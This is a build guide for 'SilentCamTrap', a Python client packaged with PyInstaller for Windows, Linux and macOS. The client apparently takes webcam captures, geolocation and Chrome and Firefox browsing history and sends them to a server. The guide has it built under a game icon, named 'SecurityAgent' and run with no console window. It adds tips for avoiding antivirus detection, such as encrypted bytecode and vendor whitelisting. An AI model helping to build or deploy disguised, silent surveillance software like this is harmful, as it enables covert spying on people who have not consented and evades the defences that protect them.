# 🏗️ Build Guide

Complete guide for building SilentCamTrap Python client as a standalone executable.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Windows Build](#windows-build)
3. [Linux Build](#linux-build)
4. [macOS Build](#macos-build)
5. [Advanced Options](#advanced-options)
6. [Troubleshooting](#troubleshooting)

---

## Prerequisites

### All Platforms

```bash
# Install Python dependencies
cd python
pip install -r requirements.txt

# Install PyInstaller
pip install pyinstaller
```

### Platform-Specific

**Windows:**
- Python 3.8+ (64-bit recommended)
- Visual C++ Build Tools (for some dependencies)

**Linux:**
- Python 3.8+
- libv4l-dev (for webcam support)
```bash
sudo apt install libv4l-dev python3-dev
```

**macOS:**
- Python 3.8+
- Xcode Command Line Tools
```bash
xcode-select --install
```

---

## Windows Build

### Basic Build

```powershell
cd python

# Single file executable with icon
pyinstaller --onefile --icon=game.ico client.py
```

### Full Build with All Options

```powershell
pyinstaller --onefile ^
    --icon=game.ico ^
    --name=SecurityAgent ^
    --hidden-import=cv2 ^
    --hidden-import=geocoder ^
    --hidden-import=requests ^
    --noconsole ^
    --add-data="config.json;." ^
    client.py
```

### Options Explained

| Option | Description |
|--------|-------------|
| `--onefile` | Create single executable |
| `--icon=game.ico` | Set executable icon |
| `--name=SecurityAgent` | Custom executable name |
| `--hidden-import` | Include implicit imports |
| `--noconsole` | No console window (GUI mode) |
| `--add-data` | Include additional files |

### Build Output

```
python/
└── dist/
    └── SecurityAgent.exe  # Your executable
```

---

## Linux Build

### Ubuntu/Debian Build

```bash
cd python

# Basic build
pyinstaller --onefile client.py

# Make executable
chmod +x dist/client
```

### Full Build with Options

```bash
pyinstaller --onefile \
    --name=security-agent \
    --hidden-import=cv2 \
    --hidden-import=geocoder \
    --hidden-import=requests \
    --add-data="config.json:." \
    client.py
```

### Important Linux Notes

1. **Webcam Access:** Ensure user has access to `/dev/video0`
```bash
sudo usermod -a -G video $USER
```

2. **Browser Paths:** Update in config if needed:
```json
{
  "chrome_path": "~/.config/google-chrome/Default/History",
  "firefox_path": "~/.mozilla/firefox/*.default/places.sqlite"
}
```

3. **Shutdown Command:** Modify for Linux:
```python
# In client.py, shutdown uses: shutdown -h +1
```

---

## macOS Build

### Building on macOS

```bash
cd python

pyinstaller --onefile \
    --name=SecurityAgent \
    --hidden-import=cv2 \
    --hidden-import=geocoder \
    --hidden-import=requests \
    client.py
```

### Code Signing (Optional)

```bash
codesign --sign "Developer ID Application: Your Name" dist/SecurityAgent
```

### Camera Permissions

macOS requires camera permission. When running the app, grant camera access when prompted.

---

## Advanced Options

### Creating a Spec File

For more control, create a spec file:

```bash
pyi-makespec --onefile --icon=game.ico client.py
```

Edit `client.spec`:

```python
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['client.py'],
    pathex=[],
    binaries=[],
    datas=[('config.json', '.')],
    hiddenimports=['cv2', 'geocoder', 'requests'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='SecurityAgent',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # Set to False for no console
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='game.ico',
)
```

Build from spec:
```bash
pyinstaller client.spec
```

### UPX Compression

For smaller executables:

```bash
# Install UPX
# Windows: Download from https://upx.github.io/
# Linux: sudo apt install upx

# Build with UPX
pyinstaller --onefile --upx-dir=/path/to/upx client.py
```

### Anti-Virus Considerations

PyInstaller executables may trigger false positives. Solutions:
1. Sign the executable with a code signing certificate
2. Submit to AV vendors for whitelisting
3. Use `--key` option for encrypted bytecode

---

## Troubleshooting

### Common Errors

#### 1. ModuleNotFoundError

```
ModuleNotFoundError: No module named 'cv2'
```

**Solution:**
```bash
pip install opencv-python
pyinstaller --hidden-import=cv2 --onefile client.py
```

#### 2. OpenCV Import Error

```
ImportError: DLL load failed
```

**Solution (Windows):**
- Install Microsoft Visual C++ Redistributable
- Use `--runtime-tmpdir=.` option

#### 3. Webcam Not Found

**Solution:**
- Check webcam is connected
- Verify webcam index in config (try 0, 1, 2)
- On Linux: `ls /dev/video*`

#### 4. Permission Denied (Linux)

**Solution:**
```bash
chmod +x dist/client
# For webcam access:
sudo usermod -a -G video $USER
```

#### 5. Large Executable Size

**Solution:**
- Use UPX compression
- Exclude unnecessary modules:
```bash
pyinstaller --exclude-module=tkinter --exclude-module=matplotlib --onefile client.py
```

### Debug Build

For debugging issues:

```bash
pyinstaller --onefile --debug=all client.py
./dist/client
```

### Verify Build

Test the executable before deployment:

```bash
# Windows
.\dist\SecurityAgent.exe

# Linux/macOS
./dist/security-agent
```

Check the log file in `intruder_logs/client.log` for any errors.

---

## Distribution Checklist

- [ ] Build completed successfully
- [ ] Tested on target platform
- [ ] Config file updated with correct API URL
- [ ] Webcam capture works
- [ ] Data sends to server
- [ ] Executable doesn't trigger AV (or is whitelisted)

---

**Questions?** dev@devplus.fun
